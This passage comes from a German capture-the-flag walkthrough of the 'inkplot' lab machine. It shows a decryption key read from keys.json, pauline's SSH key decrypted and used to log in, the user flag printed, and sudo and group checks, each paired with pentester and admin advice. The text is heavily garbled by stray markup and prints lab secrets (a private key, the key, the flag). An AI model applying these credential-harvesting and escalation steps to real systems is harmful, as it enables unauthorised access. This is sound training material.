class="command">Qs</span>j<span class="command">PK<span class="command">q<span class="command">s</span>VR/g<span class="command">z</span><span class="command">agz</span><span class="command">C</span><span class="command">l</span>7<span class="command">ma<span class="command">St<span class="command">U307k<span class="command">L</span>e<span class="command">E</span>B<span class="command">yC</span>d4f2R49b0<span class="command">Up</span>7DQ<span class="command">v</span>k7lu/00b<span class="command">H</span><span class="command">v</span>a<span class="command">AUG</span>+/<span class="command">AAAAwQC<span class="command">qq<span class="command">hl</span>4jg<span class="command">C+</span>0<span class="command">b<span class="command">v+</span>g<span class="command">H<span class="command">c<span class="command">F<span class="command">tTv<span class="command">S</span>r1<span class="command">I<span class="command">T</span>g<span class="command">G<span class="command">c</span>5<span class="command">m</span>p<span class="command">s<span class="command">F<span class="command">H</span>w<span class="command">Wb<span class="command">N</span>tw<span class="command">QAG</span>jx<span class="command">b</span>yK4<span class="command">G</span><span class="command">q</span>e<span class="command">U35r<span class="command">F</span>6ohN<span class="command">I<span class="command">t</span>8u<span class="command">s<span class="command">ABACkb</span>2hRW42<span class="command">U+PPE</span>3<span class="command">M</span>2<span class="command">G<span class="command">s</span>Mp<span class="command">Pb</span>r<span class="command">W<span class="command">y</span>f0<span class="command">JT</span>gw<span class="command">C</span>8<span class="command">XH</span>w5<span class="command">hE7</span>ibP4<span class="command">QY<span class="command">K2y<span class="command">An</span>409z<span class="command">Un</span>w6<span class="command">K</span><span class="command">A<span class="command">N0</span>tu<span class="command">S<span class="command">T</span>by<span class="command">Q</span>tr<span class="command">a</span><span class="command">V</span>u<span class="command">q0<span class="command">TJe<span class="command">Y<span class="command">U3n<span class="command">oV</span>JUf<span class="command">F<span class="command">m<span class="command">s</span>0x1Q<span class="command">AH<span class="command">Bc<span class="command">xM</span>9<span class="command">Z</span>9k+1+u<span class="command">j<span class="command">X<span class="command">l</span><span class="command">cZ<span class="command">i</span>k9<span class="command">C</span>3<span class="command">q</span>hE<span class="command">A<span class="command">U<span class="command">dTx</span><span class="command">i</span>k<span class="command">L</span>xjT<span class="command">Oa<span class="command">E<span class="command">h<span class="command">W<span class="command">W6y</span>41k<span class="command">V</span>78<span class="command">G</span>546<span class="command">c</span>g<span class="command">U<span class="command">c</span>jR<span class="command">O<span class="command">Bu</span>21z<span class="command">Ys</span>Y0<span class="command">G</span>8<span class="command">tP<span class="command">j<span class="command">o<span class="command">b<span class="command">tS</span>zuW+Hk<span class="command">o</span>k<span class="command">ymo<span class="command">AAADBAPJK<span class="command">+_C</span><span class="command">o</span>u<span class="command">V<span class="command">y<span class="command">d</span>Em<span class="command">o</span>2n9RNYb9xX4J0PQg<span class="command">k<span class="command">y</span>60<span class="command">EQx</span>5x<span class="command">q</span>e<span class="command">AL<span class="command">Wh<span class="command">R</span>q<span class="command">JX</span>et<span class="command">m</span>zgy<span class="command">Am</span>tr<span class="command">l</span>u<span class="command">GA</span>+4u0ec<span class="command">y</span>y<span class="command">VA</span>7<span class="command">X<span class="command">K</span>1<span class="command">Sy</span>Nd<span class="command">EN</span>Hk<span class="command">Tb</span>3NNCz<span class="command">Z<span class="command">vj</span>f<span class="command">HH</span>rf<span class="command">D<span class="command">m</span>3w799PVP3d<span class="command">A</span>hp<span class="command">I3J<span class="command">b</span>1kF<span class="command">d3H<span class="command">y</span>MDa<span class="command">F<span class="command">IF</span>3p1<span class="command">K</span>x/G<span class="command">b</span>8<span class="command">Uy<span class="command">O<span class="command">q</span>liLh9w<span class="command">O</span>W<span class="command">Ma</span>r<span class="command">u</span>v<span class="command">s</span>L4F<span class="command">v</span><span class="command">O<span class="command">l</span>f<span class="command">W7Y</span>9u<span class="command">YkiM</span>8<span class="command">ZHtx<span class="command">UcYE<span class="command">R</span>j7q<span class="command">Tb</span>J<span class="command">f</span>4PM<span class="command">l</span><span class="command">D</span>q<span class="command">D</span>8/P86j<span class="command">L<span class="command">O</span>1<span class="command">yU<span class="command">m</span>y57<span class="command">JU</span>10nr2<span class="command">U3<span class="command">h</span>bYFF<span class="command">Gxg</span>p2<span class="command">cUG</span>g+kK<span class="command">u</span>l<span class="command">X<span class="command">q</span>V<span class="command">q</span>1<span class="command">JK</span>rlbza<span class="command">D</span>n<span class="command">ZJE</span>w6<span class="command">qow<span class="command">AAAMEAu<span class="command">Ke</span>/LnhW<span class="command">S</span><span class="command">Tb<span class="command">I</span>gw29<span class="command">mG<span class="command">R<span class="command">h<span class="command">ob</span>fl<span class="command">Si</span>PZQ9<span class="command">mQ7+i<span class="command">EWQW</span>w7<span class="command">F<span class="command">OW</span>p8<span class="command">iG7OQ3<span class="command">b<span class="command">uF<span class="command">MC<span class="command">vps<span class="command">a</span><span class="command">f<span class="command">j</span>e8+P<span class="command">L</span>4<span class="command">b<span class="command">V0u<span class="command">K<span class="command">m<span class="command">I</span>6<span class="command">a</span><span class="command">l</span>K2<span class="command">I</span>nq<span class="command">G</span><span class="command">l</span>N7j<span class="command">t</span>+F<span class="command">Y<span class="command">LCD</span>ug<span class="command">sm<span class="command">UW<span class="command">iA</span><span class="command">6K</span>r<span class="command">l</span><span class="command">s<span class="command">F<span class="command">X</span>tP<span class="command">v/B<span class="command">O</span>o6<span class="command">L<span class="command">K</span>5<span class="command">Ye</span>6<span class="command">O<span class="command">T<span class="command">Y<span class="command">IQ</span>n<span class="command">IR</span>E5g<span class="command">k<span class="command">p<span class="command">UJ</span>1<span class="command">F<span class="command">u<span class="command">PS<span class="command">Q4d</span>Px<span class="command">w<span class="command">l<span class="command">I740<span class="command">OH<span class="command">Ai</span>B7<span class="command">BH</span>NgJ<span class="command">Qh</span>d+El<span class="command">s<span class="command">YwM<span class="command">B</span>rh<span class="command">upND<span class="command">NO</span>jG<span class="command">I<span class="command">s</span>b<span class="command">O</span>2t5<span class="command">y/OE</span>Gw4ig<span class="command">i</span>f4<span class="command">F</span>bh<span class="command">D</span>9G<span class="command">q<span class="command">Ocg<span class="command">D</span>m<span class="command">Yo</span><span class="command">X</span>SPxq<span class="command">LUB</span>8d<span class="command">i</span>upP<span class="command">UEGU</span>H<span class="command">OB<span class="command">OS</span>pa<span class="command">D</span>f<span class="command">AD</span>8y<span class="command">hi</span><span class="command">Um<span class="command">b<span class="command">U<span class="command">zAAAADnB<span class="command">a</span><span class="command">u</span>l<span class="command">i</span>ne<span class="command">AE</span>Z<span class="command">G</span><span class="command">V</span><span class="command">i</span><span class="command">YW4BA<span class="command">IDBA</span>==</span>
<span class="password">-----END <span class="command">O</span>PEN<span class="command">S</span><span class="command">S</span>H PRIV<span class="command">A</span>TE KEY-----</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Nachdem ich den verschlüsselten privaten SSH-Schlüssel von `pauline` erhalten habe, benötige ich nun den Entschlüsselungsschlüssel, um ihn zu verwenden. Gemäß der Analyse des `cipher.py` Skripts wird der Schlüssel aus der Datei `/home/pauline/keys.json` gelesen. Ich zeige den Inhalt dieser Datei mit `cat /home/pauline/keys.json` an.
            </p>
            <p class="evaluation">
                **Bewertung:** Fantastisch! Der Inhalt von `keys.json` ist eine JSON-Struktur, die den Schlüssel `<span class="password">aLLtBh0BVCFSvfZ203sM</span>` für den Eintrag `"crypt_key"` enthält. Dies ist genau der Schlüssel, der vom `cipher.py` Skript zum Verschlüsseln und Entschlüsseln verwendet wird. Mit diesem Schlüssel kann ich nun den zuvor extrahierten, verschlüsselten privaten SSH-Schlüssel von `pauline` entschlüsseln und ihn für die Anmeldung verwenden.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Wenn ein Skript Schlüssel oder Passwörter aus Dateien liest, suche diese Dateien sofort im Dateisystem. Sie sind oft leicht zugänglich, wenn das Skript mit erhöhten Rechten läuft.
                <br>**Empfehlung (Admin):** Speichere niemals Schlüssel oder Passwörter im Klartext im Dateisystem, selbst wenn die Datei durch Berechtigungen geschützt zu sein scheint. Nutze sicherere Speichermechanismen oder Secrets Management Systeme.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─pauline@inkplot ~</span>
<span class="command">╰─$ <span class="command">c</span><span class="command">a</span>t key<span class="command">s</span>.j<span class="command">s</span><span class="command">o</span>n</span></pre>
                </div>
                <div class="terminal">
                    <pre>{
    <span class="command">"crypt_key": "<span class="password">aLLtBh0BVCFSvfZ203sM</span>"</span> <span class="password"><-- Ent<span class="command">s</span><span class="command">c</span>hl<span class="command">ü</span><span class="command">s</span><span class="command">s</span>el<span class="command">u</span>ng<span class="command">s</span><span class="command">s</span><span class="command">c</span>hl<span class="command">ü</span><span class="command">s</span><span class="command">s</span> gef<span class="command">u</span>nden!</span>
}
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Mit dem Entschlüsselungsschlüssel `<span class="password">aLLtBh0BVCFSvfZ203sM</span>` kann ich nun den verschlüsselten privaten SSH-Schlüssel von `pauline` (`id_rsa.enc` oder `id_rsa_cp.enc`) entschlüsseln. Ich verwende das `cipher.py` Skript erneut, diesmal mit der Option `-d` und dem Pfad zur verschlüsselten Datei (z.B. `/tmp/id_rsa_cp.enc`). Wenn das Skript nach dem Schlüssel fragt, gebe ich den gefundenen Schlüssel ein. Nach der Entschlüsselung speichere ich den Inhalt als unverschlüsselte private Schlüsseldatei (z.B. `pauli_id`) auf meinem Angreifer-System. Ich setze die korrekten Berechtigungen (`chmod 600 pauli_id`) und versuche dann, mich per SSH als Benutzer `pauline` am Zielsystem (`inplot.hmv` oder 192.168.2.43) anzumelden, wobei ich die entschlüsselte private Schlüsseldatei (`pauli_id`) mit dem `-i` Parameter angebe. Ich verbinde mich direkt zum SSH-Port 22.
            </p>
            <p class="evaluation">
                **Bewertung:** Fantastisch! Der SSH-Login als Benutzer `pauline` mit dem entschlüsselten privaten Schlüssel ist erfolgreich. Dies wird durch die SSH-Willkommensnachricht und den Prompt `╭─pauline@inkplot ~ ╰─$` bestätigt. Ich habe nun vollen Shell-Zugriff als Benutzer `pauline`. Dies ist der erfolgreiche Privilege Escalation-Schritt von `leila` zu `pauline`, erlangt durch die Ausnutzung der unsicheren Speicherung des Entschlüsselungsschlüssels und des misskonfigurierten `sudo` Eintrags für das `cipher.py` Skript.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Nutze gefundene Schlüssel sofort, um verschlüsselte Dateien oder Zugänge zu entschlüsseln. Verwende die entschlüsselten privaten SSH-Schlüssel zur Authentifizierung.
                <br>**Empfehlung (Admin):** **Dringend:** Entferne den Schlüssel aus `/home/pauline/keys.json`. Ändere den `crypt_key` und verwende eine sicherere Methode zur Schlüsselverwaltung. Stelle sicher, dass private SSH-Schlüssel niemals verschlüsselt, aber mit öffentlich zugänglichem Schlüssel gespeichert werden. Implementiere passwortgeschützte private SSH-Schlüssel.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">┌──(root㉿CCat)-[~]
└─# nano pauli_id</span></pre>
                </div>
                 <div class="terminal">
                    <pre></pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">┌──(root㉿CCat)-[~]
└─# chmod 600 pauli_id</span></pre>
                </div>
                <div class="terminal">
                    <pre></pre>
                </div>
            </div>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">┌──(root㉿CCat)-[~]
└─# ssh2john pauli_id &gt; hash</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">p<span class="command">a</span>ul<span class="command">i</span>_i<span class="command">d</span> h<span class="command">a</span><span class="command">s</span> n<span class="command">o</span> p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd!</span></pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">┌──(root㉿CCat)-[~]
└─# ssh -i pauli_id pauline@inplot.hmv</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="command">The authenticity <span class="command">o</span>f h<span class="command">o</span><span class="command">s</span>t 'inpl<span class="command">o</span>t.h<span class="command">m</span><span class="command">v</span> (192.168.2.43)' <span class="command">c</span><span class="command">a</span>n't be e<span class="command">s</span>t<span class="command">a</span>bl<span class="command">i</span><span class="command">s</span>hed.</span>
ED25519 key fingerpr<span class="command">i</span>nt <span class="command">i</span><span class="command">s</span> <span class="command">S<span class="command">H</span><span class="command">A</span>256:TC<span class="command">A</span>/<span class="command">s</span><span class="command">s</span>XF<span class="command">a</span>E<span class="command">c</span>0<span class="command">s</span><span class="command">O</span>Jl0l<span class="command">v</span>YyqTVTr<span class="command">C</span>pkF0w<span class="command">Qf</span>yj5<span class="command">m<span class="command">J<span class="command">sALc</span>.</span></span>
Th<span class="command">i</span><span class="command">s</span> h<span class="command">o</span><span class="command">s</span>t key <span class="command">i</span><span class="command">s</span> known by the f<span class="command">o</span>ll<span class="command">o</span>w<span class="command">i</span>ng <span class="command">o</span>ther n<span class="command">a</span>me<span class="command">s</span>/<span class="command">a</span>ddre<span class="command">ss</span>e<span class="command">s</span>:
    ~/.<span class="command">s</span><span class="command">s</span>h/known_h<span class="command">o</span><span class="command">s</span>t<span class="command">s</span>:108: [h<span class="command">a</span><span class="command">s</span>hed n<span class="command">a</span><span class="command">m</span>e]
    ~/.<span class="command">s</span><span class="command">s</span>h/known_h<span class="command">o</span><span class="command">s</span>t<span class="command">s</span>:112: [h<span class="command">a</span><span class="command">s</span>hed n<span class="command">a</span><span class="command">m</span>e]
Are y<span class="command">o</span>u <span class="command">s</span>ure y<span class="command">o</span>u w<span class="command">a</span>nt t<span class="command">o</span> <span class="command">c</span><span class="command">o</span>ntin<span class="command">u</span>e <span class="command">c</span><span class="command">o</span>nne<span class="command">c</span>t<span class="command">i</span>ng (ye<span class="command">s</span>/n<span class="command">o</span>/[f<span class="command">i</span>ngerpr<span class="command">i</span>nt])? ye<span class="command">s</span>
<span class="password">Warn<span class="command">i</span>ng: Per<span class="command">m</span><span class="command">a</span>nent<span class="command">l</span>y <span class="command">a</span>dded 'inpl<span class="command">o</span>t.h<span class="command">m</span><span class="command">v</span>' (ED25519) t<span class="command">o</span> the l<span class="command">i</span><span class="command">s</span>t <span class="command">o</span>f known h<span class="command">o</span><span class="command">s</span>t<span class="command">s</span>.</span>
<span class="command">A<span class="command">u</span>t<span class="command">o</span>-<span class="command">s</span>t<span class="command">a</span>ndby n<span class="command">o</span>w <span class="command">a</span><span class="command">c</span>t<span class="command">i</span><span class="command">v</span><span class="command">a</span>ted <span class="command">a</span>fter 2 <span class="command">m</span><span class="command">i</span>n <span class="command">o</span>f <span class="command">i</span>n<span class="command">a</span><span class="command">c</span>t<span class="command">i</span><span class="command">v</span>ity</span>
<span class="password">L<span class="command">i</span>n<span class="command">u</span>x <span class="command">i</span>nkpl<span class="command">o</span>t 6.1.<span class="command">0</span>-1<span class="command">0</span>-<span class="command">a</span><span class="command">m</span>d64 #1 <span class="command">S</span>MP PREEMPT_DYN<span class="command">A</span>MIC Deb<span class="command">i</span><span class="command">a</span>n 6.1.38-1 (2<span class="command">0</span>23-<span class="command">0</span>7-14) x86_64</span>

<span class="command">The pr<span class="command">o</span>gr<span class="command">a</span><span class="command">m</span><span class="command">s</span> <span class="command">i</span>n<span class="command">c</span>l<span class="command">u</span>ded w<span class="command">i</span>th the Deb<span class="command">i</span><span class="command">a</span>n GNU/L<span class="command">i</span>n<span class="command">u</span>x <span class="command">s</span>y<span class="command">s</span>tem <span class="command">a</span>re free <span class="command">s</span><span class="command">o</span>ftw<span class="command">a</span>re;</span>
the ex<span class="command">ac</span>t d<span class="command">i</span><span class="command">s</span>tr<span class="command">i</span>b<span class="command">u</span>t<span class="command">i</span><span class="command">o</span>n ter<span class="command">m</span><span class="command">s</span> f<span class="command">o</span>r e<span class="command">ac</span>h pr<span class="command">o</span>gr<span class="command">a</span>m <span class="command">a</span>re de<span class="command">sc</span>r<span class="command">i</span>bed <span class="command">i</span>n the
<span class="command">i</span>nd<span class="command">i</span><span class="command">v</span>id<span class="command">u</span><span class="command">a</span>l file<span class="command">s</span> <span class="command">i</span>n /u<span class="command">s</span>r/<span class="command">s</span>h<span class="command">a</span>re/d<span class="command">o</span><span class="command">c</span>/*/copyright.

Deb<span class="command">i</span><span class="command">a</span>n GNU/L<span class="command">i</span>n<span class="command">u</span>x <span class="command">c</span><span class="command">o</span><span class="command">m</span>e<span class="command">s</span> w<span class="command">i</span>th <span class="command">A</span>B<span class="command">S</span>OLUTELY N<span class="command">O</span> W<span class="command">A</span>RR<span class="command">A</span>NTY, t<span class="command">o</span> the extent
per<span class="command">m</span><span class="command">i</span>tted by <span class="command">a</span>ppl<span class="command">i</span><span class="command">c</span><span class="command">a</span>ble l<span class="command">a</span>w.
<span class="command">[<span class="command">o</span>h-<span class="command">m</span>y-z<span class="command">s</span>h] W<span class="command">o</span>uld y<span class="command">o</span>u l<span class="command">i</span>ke t<span class="command">o</span> <span class="command">u</span>pd<span class="command">a</span>te? [<span class="command">Y</span>/n] y</span>
....
...
..
         __                                     __
  ____  / /_     ____ ___  __  __   ____  _____/ /_
 / __ \/ __ \   / __ `__ \/ / / /  /_  / / ___/ __ \
/ /_/ / / / /  / / / / / / /_/ /    / /_(__  ) / / /
\____/_/ /_/  /_/ /_/ /_/\__, /    /___/____/_/ /_/
                        /____/

<span class="password">H<span class="command">oo</span>rr<span class="command">a</span>y! <span class="command">O</span>h My Z<span class="command">s</span>h h<span class="command">a</span><span class="command">s</span> been upd<span class="command">a</span>ted!</span>

To keep up w<span class="command">i</span>th the l<span class="command">a</span>te<span class="command">s</span>t new<span class="command">s</span> <span class="command">a</span>nd upd<span class="command">a</span>te<span class="command">s</span>, f<span class="command">o</span>ll<span class="command">o</span>w <span class="command">u</span><span class="command">s</span> <span class="command">o</span>n Tw<span class="command">i</span>tter: <span class="command">[Link: https://twitter.com/ohmyzsh | Ziel: https://twitter.com/ohmyzsh]</span>
W<span class="command">a</span>nt to get <span class="command">i</span>n<span class="command">v</span><span class="command">o</span>l<span class="command">v</span>ed <span class="command">i</span>n the <span class="command">c</span><span class="command">o</span><span class="command">m</span><span class="command">m</span>un<span class="command">i</span>ty? J<span class="command">oi</span>n <span class="command">o</span>ur Di<span class="command">sc</span>ord: <span class="command">[Link: https://discord.gg/ohmyzsh | Ziel: https://discord.gg/ohmyzsh]</span>
Get y<span class="command">o</span>ur <span class="command">O</span>h My Z<span class="command">s</span>h <span class="command">s</span>w<span class="command">a</span>g <span class="command">a</span>t: <span class="command">[Link: https://shop.planetargon.com/collections/oh-my-zsh | Ziel: https://shop.planetargon.com/collections/oh-my-zsh]</span>
<span class="password">╭─pauline@inkplot ~</span>
<span class="password">╰─$</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Nachdem ich SSH-Zugriff als Benutzer `pauline` habe, führe ich grundlegende Systemaufklärung durch, um Privilege Escalation-Vektoren auf Root zu finden. Ich beginne mit der Auflistung der Dateien und Verzeichnisse in Paulines Home-Verzeichnis (`ls -la`) und zeige den Inhalt der Datei `user.txt` an.
            </p>
            <p class="evaluation">
                **Bewertung:** Die Auflistung zeigt neben den bekannten Konfigurationsdateien auch die Datei `user.txt`. Der Inhalt von `user.txt` ist die User-Flag (`<span class="password">a2c145eb8279c2f920de6871bef794fa</span>`). Dies ist zwar nicht direkt ein PE-Vektor, aber das Erreichen der User-Flag ist ein Meilenstein im Test. Die Datei `keys.json` ist ebenfalls im Verzeichnis vorhanden und hat die Berechtigungen `-rw-r-----`, was bedeutet, dass sie für Paulines Gruppe (pauline) lesbar ist, aber nicht für andere. Da ich jetzt `pauline` bin, kann ich diese Datei lesen.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Sammle alle Flags, sobald du auf sie triffst. Setze die Aufklärung im neuen Benutzerkontext fort. Prüfe Dateiberechtigungen sorgfältig auf Dateien, die du zuvor nicht lesen konntest.
                <br>**Empfehlung (Admin):** Speichere Flags oder sensible Dateien nicht in Standard-Home-Verzeichnissen. Stelle sicher, dass Dateiberechtigungen korrekt gesetzt sind, um unberechtigten Zugriff zu verhindern.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─pauline@inkplot ~</span>
<span class="command">╰─$ ls -la</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="command">t<span class="command">o</span>t<span class="command">a</span>l 72</span>
<span class="command">drwx---r-x  5 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne 4<span class="command">0</span>96 Jun 14 23:47 .</span>
<span class="command">drwxr-xr-x  4 r<span class="command">o</span><span class="command">o</span>t    r<span class="command">o</span><span class="command">o</span>t    4<span class="command">0</span>96 Jul 28  2023 ..</span>
<span class="command">-rw-r--r--  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne  220 Jul 22  2023 .b<span class="command">a</span><span class="command">s</span>h_l<span class="command">o</span>g<span class="command">o</span>ut</span>
<span class="command">-rw-r--r--  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne 3526 Jul 22  2023 .b<span class="command">a</span><span class="command">s</span>hrc</span>
<span class="command">-rw-r--r--  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne 1738 Aug  1  2023 <span class="command">c</span><span class="command">i</span>pher.py</span>
<span class="command">-rw-r--r--  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne 3472 Jun 14 23:2<span class="command">0</span> <span class="command">i</span>d_r<span class="command">s</span><span class="command">a</span>_<span class="command">c</span>p.en<span class="command">c</span>.en<span class="command">c</span></span>
<span class="command">-rw-r--r--  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne 3472 Jun 14 23:19 <span class="command">i</span>d_r<span class="command">s</span><span class="command">a</span>.en<span class="command">c</span></span>
<span class="command">-rw-r-----  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne   44 Jul 25  2023 key<span class="command">s</span>.j<span class="command">s</span><span class="command">o</span>n</span>
<span class="command">-rw-------  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne   2<span class="command">0</span> Aug  1  2023 .le<span class="command">ss</span>h<span class="command">s</span>t</span>
<span class="command">drwxr-xr-x  3 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne 4<span class="command">0</span>96 Jul 22  2023 .l<span class="command">o</span><span class="command">c</span><span class="command">a</span>l</span>
<span class="command">drwxr-xr-x 13 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne 4<span class="command">0</span>96 Jun 14 23:46 .<span class="command">o</span>h-<span class="command">m</span>y-z<span class="command">s</span>h</span>
<span class="command">-rw-r--r--  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne  8<span class="command">0</span>7 Jul 22  2023 .pr<span class="command">o</span>file</span>
<span class="command">drwx------  2 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne 4<span class="command">0</span>96 Jul 28  2023 .<span class="command">s</span><span class="command">s</span>h</span>
<span class="command">-rw-r--r--  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne    <span class="command">0</span> Jul 25  2023 .<span class="command">s</span><span class="command">u</span>d<span class="command">o</span>_a<span class="command">s</span>_<span class="command">a</span>d<span class="command">m</span><span class="command">i</span>n_<span class="command">s</span><span class="command">u</span><span class="command">c</span><span class="command">c</span>e<span class="command">s</span><span class="command">s</span>f<span class="command">u</span>l</span>
<span class="command">-rwx------  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne   33 Jul 24  2023 <span class="command">u</span><span class="command">s</span>er.txt</span>
<span class="command">-rw-r--r--  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne   44 Jun 14 23:15 <span class="command">u</span><span class="command">s</span>er.txt.en<span class="command">c</span></span>
<span class="command">-rw-r--r--  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne  169 Jun 14 23:46 .wget-h<span class="command">s</span>t<span class="command">s</span></span>
<span class="command">-rw-------  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne   22 Jun 14 23:47 .z<span class="command">s</span>h_h<span class="command">i</span><span class="command">s</span>t<span class="command">o</span>ry</span>
<span class="command">-rw-r--r--  1 p<span class="command">a</span>ul<span class="command">i</span>ne p<span class="command">a</span>ul<span class="command">i</span>ne 3890 Jul 22  2023 .z<span class="command">s</span>hrc</span></pre>
                </div>
            </div>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─pauline@inkplot ~</span>
<span class="command">╰─$ cat user.txt</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">a2<span class="command">c</span>145eb8279<span class="command">c</span>2f92<span class="command">0</span>de6871bef794f<span class="command">a</span></span></pre>
                </div>
            </div>
             <p class="analysis">
                **Analyse:** Ich zeige den Inhalt der Datei `/home/pauline/keys.json` an, um den Entschlüsselungsschlüssel für das `cipher.py` Skript zu erhalten.
            </p>
            <p class="evaluation">
                **Bewertung:** Wie bereits in der Analyse der Testphase festgestellt, enthält `keys.json` den kritischen Schlüssel `<span class="password">aLLtBh0BVCFSvfZ203sM</span>`. Mit diesem Schlüssel kann ich nun alle Dateien entschlüsseln, die mit dem `cipher.py` Skript verschlüsselt wurden, und potenziell sensible Informationen im Klartext erhalten.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Suche immer nach Schlüsseldateien oder Konfigurationsdateien, die Passwörter oder Schlüssel enthalten, insbesondere im Home-Verzeichnis des aktuellen Benutzers.
                <br>**Empfehlung (Admin):** Speichere Schlüssel niemals im Klartext im Dateisystem. Nutze Umgebungsvariablen oder sichere Schlüsselverwaltungssysteme. Setze restriktive Dateiberechtigungen für alle Dateien, die Schlüssel oder Passwörter enthalten.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─pauline@inkplot ~</span>
<span class="command">╰─$ cat key<span class="command">s</span>.j<span class="command">s</span><span class="command">o</span>n</span></pre>
                </div>
                <div class="terminal">
                    <pre>{
    <span class="command">"crypt_key": "<span class="password">aLLtBh0BVCFSvfZ203sM</span>"</span> <span class="password"><-- Ent<span class="command">s</span><span class="command">c</span>hl<span class="command">ü</span><span class="command">s</span><span class="command">s</span>el<span class="command">u</span>ng<span class="command">s</span><span class="command">s</span><span class="command">c</span>hl<span class="command">ü</span><span class="command">s</span><span class="command">s</span> gef<span class="command">u</span>nden!</span>
}
</pre>
                </div>
            </div>

             <p class="analysis">
                **Analyse:** Als Benutzer `pauline` prüfe ich erneut die `sudo`-Berechtigungen mit `sudo -l`, um herauszufinden, ob `pauline` Befehle als Root ausführen darf. Dies ist der entscheidende Schritt zur Root Privilege Escalation.
            </p>
             <p class="evaluation">
                **Bewertung:** Die Ausgabe zeigt, dass der Benutzer `pauline` kein `NOPASSWD`-Eintrag hat (`sudo: a password is required`) und daher ein Passwort eingeben müsste, um `sudo`-Befehle auszuführen. Dies bedeutet, dass ich das Root-Passwort von `pauline` benötige, um den direkten Weg über `sudo` zu nutzen. Obwohl dies eine sicherere Konfiguration ist als bei `leila` und `juan`, bedeutet es, dass dieser Weg für eine *passwortlose* PE blockiert ist.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Auch wenn ein `sudo`-Eintrag existiert, prüfe, ob ein Passwort benötigt wird. Wenn ja, suche weiter nach anderen PE-Vektoren, es sei denn, du hast das Passwort des Benutzers.
                <br>**Empfehlung (Admin):** Konfiguriere `sudo` so, dass immer ein Passwort für die Ausführung von Befehlen als ein anderer Benutzer benötigt wird, insbesondere als Root.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─pauline@inkplot ~</span>
<span class="command">╰─$ sudo -l</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">[<span class="command">s</span><span class="command">u</span>d<span class="command">o</span>] p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd f<span class="command">o</span>r p<span class="command">a</span>ul<span class="command">i</span>ne:</span>
<span class="password">s<span class="command">u</span>d<span class="command">o</span>: <span class="command">a</span> p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd <span class="command">i</span><span class="command">s</span> re<span class="command">q</span>u<span class="command">i</span>red</span></pre>
                </div>
            </div>

             <p class="analysis">
                **Analyse:** Ich überprüfe meine aktuelle Benutzer-ID und Gruppenzugehörigkeit als Benutzer `pauline`.
            </p>
            <p class="evaluation">
                **Bewertung:** Die Ausgabe zeigt, dass ich als `uid=1000(pauline)` mit der primären Gruppe `gid=1000(pauline)` angemeldet bin und Mitglied der zusätzlichen Gruppen `100(users)` und `1002(admin)` bin. Die Zugehörigkeit zur Gruppe `admin` ist sehr interessant, da diese Gruppe oft besondere Berechtigungen im Dateisystem oder für bestimmte Systemdienste hat. Dies ist ein vielversprechender Ansatzpunkt für die Privilege Escalation.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Prüfe immer die Gruppenzugehörigkeiten eines kompromittierten Benutzers. Suche nach ungewöhnlichen oder privilegierten Gruppen. Analysiere, welche Berechtigungen mit der Zugehörigkeit zu diesen Gruppen einhergehen.
                <br>**Empfehlung (Admin):** Weise Benutzer nur den absolut notwendigen Gruppen zu. Vermeide es, normale Benutzer zu administrativen Gruppen wie `admin` oder `sudo` hinzuzufügen, es sei denn, es ist unerlässlich. Führe regelmäßige Überprüfungen der Gruppenzugehörigkeiten durch.
            </p>
